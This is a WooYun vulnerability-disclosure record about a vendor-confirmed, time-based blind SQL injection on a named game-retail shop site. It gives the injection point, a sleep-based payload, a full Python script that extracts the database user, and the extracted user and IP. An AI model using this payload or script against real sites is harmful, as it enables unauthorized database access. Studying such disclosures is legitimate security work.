{"id": 25261, "wybug_id": "wooyun-2015-0132101", "wybug_title": "游侠网某站存在SQL盲注", "wybug_corp": "ali213.net", "wybug_author": "星明月稀", "wybug_date": "2015-08-06 17:44", "wybug_open_date": "2015-09-21 09:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向公众公开  简要描述： 游侠网某站存在SQL盲注 详细说明：  问题站点：shop.ali213.com注入点：\nshop.ali213.com/getkey/old.htmlgetkeyoldForm[commodity_id]=sleep(if(1=1,5,0))&getkeyoldForm[nm_mm]=1&getkeyoldForm[nm_yh]=1\n参数getkeyoldForm[commodity_id]可注入，基于时间盲注！   漏洞证明：  猜解user(),得：\nfhyx_shop@60.191.72.167\n\n\n借用@lijiejie脚本：\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport hashlibimport urllibheaders = {    'Content-Type': 'application/x-www-form-urlencoded',    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36',}payloads = list(string.ascii_lowercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.']print '[%s] Start to retrive MySQL User' % time.strftime('%H:%M:%S', time.localtime())user = ''for i in range(1, 24):    found=False    while found==False:        for payload in payloads:            timeout_count = 0            for j in range(1,3):   # 2 times to confirm                try:                    params = {                        'getkeyoldForm[commodity_id]': \"(if(ascii(mid(lower(user()),%s,1))=%s,sleep(3),0))\" % (i, ord(payload)),                        'getkeyoldForm[nm_mm]': 1,                        'getkeyoldForm[nm_yh]': 1                    }                    body = urllib.urlencode(params)                    conn = httplib.HTTPConnection('shop.ali213.com', timeout=3)                    conn.request(method='POST',                                 url='/getkey/old.html',                                 body=body,                                 headers=headers)                    conn.getresponse().read()                    conn.close()                    print '.',                    break                except Exception, e:                    timeout_count += 1            if timeout_count == 2:                user += payload                print '\\n[In progress] now user is %s' % user                found = True                break        print '\\nFinally, MySQL user is', user\n   修复方案：  过滤或转义   版权声明：转载请注明来源 星明月稀@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-07 09:08 厂商回复： 非常感谢您 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}